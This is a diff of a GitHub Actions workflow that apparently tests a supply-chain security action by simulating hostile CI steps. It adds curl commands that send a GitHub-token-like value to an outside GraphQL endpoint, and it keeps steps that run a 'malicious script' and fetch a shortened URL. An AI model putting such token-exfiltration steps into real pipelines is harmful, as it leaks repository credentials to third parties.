@@ -1,4 +1,4 @@
-name: Automation Policy Applied
+name: Automation No Policy Applied
 
 on:
   workflow_dispatch:
@@ -57,9 +57,9 @@ jobs:
       - name: Make cURL request
         run: curl https://package-registry.free.beeceptor.com/packages
 
-   #   - name: Simulate long-running task
-     #   continue-on-error: true
-   #     run: sleep 200 
+      # - name: Simulate long-running task
+      #   continue-on-error: true
+      #   run: sleep 200 
 
       - name: 😈 Execute malicious script
         run: bash run_malicious_scripts.sh
@@ -72,8 +72,9 @@ jobs:
             "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
           }'
 
-      - name: Response Status Code Policy (Trigger 400 Bad Request)
-        run: curl -k -X POST https://api.github.com/endpoint
+          curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+
+          curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
       - name: Mime Type Policy
         run: curl -s -L "https://tinyurl.com/invisirisk"
@@ -86,5 +87,3 @@ jobs:
         uses: invisirisk/pse-action@latest
         with:
           cleanup: "true"
-
-
